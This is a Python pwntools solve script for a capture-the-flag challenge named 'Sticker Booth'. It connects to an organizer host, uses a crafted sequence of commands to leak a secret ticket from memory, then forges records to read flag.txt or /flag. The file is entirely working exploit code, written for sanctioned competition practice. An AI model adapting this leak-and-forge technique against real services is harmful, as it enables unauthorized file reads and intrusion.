#!/usr/bin/env python3
import argparse
import re
import struct
from pathlib import Path

from pwn import context, remote

BINARY = Path(__file__).resolve().parent / "work" / "chall"

import zipfile
def _ensure_binary():
    if not BINARY.exists():
        BINARY.parent.mkdir(parents=True, exist_ok=True)
        with zipfile.ZipFile(Path(__file__).resolve().parent / "files" / "handout.zip") as zf:
            BINARY.write_bytes(zf.read("chall"))


def upload(name: bytes, payload: bytes) -> bytes:
    return b"upload " + name + b" " + payload.hex().encode()


def main():
    parser = argparse.ArgumentParser(description="Solve Sticker Booth")
    parser.add_argument("host", help="organizer instance hostname")
    parser.add_argument("port", type=int, help="organizer instance port")
    args = parser.parse_args()
    _ensure_binary()

    context.log_level = "error"
    io = remote(args.host, args.port, ssl=True, sni=args.host, timeout=10)
    try:
        io.recvuntil(b"Sticker Booth recipe runner\n")

        caption = b"A" * 100
        photo = b"photo p 16 1 " + (b"\x11\x22\x33\xff" * 16).hex().encode()
        leak_record = struct.pack("<HBBIQ", 1, 1, 0, 120, 0) + b"Z" * 104
        first_stage = b"\n".join(
            [
                photo,
                b"caption a " + caption,
                b"caption b " + caption,
                b"builtin badge heart",
                b"mono p",
                b"remove a",
                upload(b"leak", leak_record),
                b"print",
            ]
        ) + b"\n"
        io.send(first_stage)

        io.recvuntil(b"=== sticker sheet ===\n")
        io.recvuntil(b"leak: [custom sticker]\n")
        io.recvuntil(b"b: ")
        leaked_caption = io.recvn(120)
        ticket = leaked_caption[112:120]
        io.recvuntil(b"badge: <3\n")

        for index, path in enumerate((b"flag.txt", b"/flag")):
            io.sendline(b"remove leak" if index == 0 else b"remove final")
            record = struct.pack(
                "<HBBIQ", 1, 2, 1, len(path), int.from_bytes(ticket, "little")
            ) + path
            io.send(upload(b"final", record) + b"\nprint\n")
            io.recvuntil(b"=== sticker sheet ===\n")
            output = io.recvuntil(b"badge: <3\n")
            match = re.search(rb"FortID\{[^}\r\n]+\}", output)
            if match:
                print(match.group().decode())
                return

        raise RuntimeError("neither flag.txt nor /flag produced a flag")
    finally:
        io.close()


if __name__ == "__main__":
    main()
